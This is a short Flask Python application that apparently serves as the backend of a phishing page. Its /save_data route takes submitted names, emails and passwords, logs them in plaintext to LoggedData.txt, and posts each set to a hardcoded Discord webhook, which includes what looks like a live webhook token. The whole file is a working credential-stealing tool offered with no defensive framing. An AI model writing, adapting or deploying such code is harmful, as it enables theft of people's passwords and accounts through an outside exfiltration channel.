import os
from flask import Flask, render_template, request, send_file
from werkzeug.middleware.shared_data import SharedDataMiddleware
import requests

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save_data', methods=['POST'])
def save_data():
    data = request.get_json()

    with open('LoggedData.txt', 'a') as f:
        f.write(f'{data["name"]}, {data["email"]}, {data["password"]}\n')

    send_to_webhook(data)

    return send_file('LoggedData.txt', attachment_filename='LoggedData.txt')

def send_to_webhook(data):
    url = 'https://discord.com/api/webhooks/1229639510888026132/egi6pOOl3j2NboANv7F-nGd9nr-koNxWxXcF-r21LNRM1LjPj8MU6BHIqs8rywFqaeUY'
    payload = {
        'username': 'Logged Data',
        'avatar_url': 'https://example.com/avatar.png',
        'content': f'Name: {data["name"]}\nEmail: {data["email"]}\nPassword: {data["password"]}'
    }

    headers = {
        'Content-Type': 'application/json'
    }

    requests.post(url, json=payload, headers=headers)

if __name__ == '__main__':
    app.wsgi_app = SharedDataMiddleware(app.wsgi_app, {
        '/': {'LoggedData.txt': {'directory_listing': True}}
    })
    app.run(host='0.0.0.0', port=5000)
